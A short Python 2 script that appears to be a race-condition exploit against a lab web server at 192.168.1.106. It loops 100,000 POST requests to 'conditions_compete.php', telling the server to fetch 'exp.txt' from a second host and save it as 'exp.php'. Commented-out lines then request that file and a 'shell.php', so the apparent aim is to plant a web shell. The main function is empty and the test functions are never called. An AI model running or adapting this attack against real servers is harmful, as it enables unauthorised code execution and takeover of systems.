# encoding:utf-8

from gevent import monkey

import os
import sys
import urllib
import urllib2
import requests
import re
import time

from urllib import quote, unquote


def test():

    posturl = 'http://192.168.1.106/scripts/conditions_compete.php'
    postdata = {
        'file':'http://192.168.1.107/scripts/exp.txt',
        'path':'exp.php'
        }
    geturl = 'http://192.168.1.106/scripts/exp.php'
    shellurl = 'http://192.168.1.106/scripts/shell.php'

    for i in xrange(100000):
        post_res = requests.post(posturl, data=postdata)
        if post_res:
            print 'post status:', post_res.status_code
        # print post_res.content
        # get_res = requests.get(geturl)
        # if get_res:
            # print 'get_res status:', get_res.status_code
        # res = requests.get(shellurl)
        # if res:
            # print res.status_code
            # print res.history
        # raw_input('test')

def test2():

    url = 'http://192.168.1.106/scripts/generate.php'

    requests.get(url)



def main():
    pass



if __name__ == '__main__':
    os.system('clear')

    if len(sys.argv) == 2:
        print 'args correct'
    else:
        print 'args error'

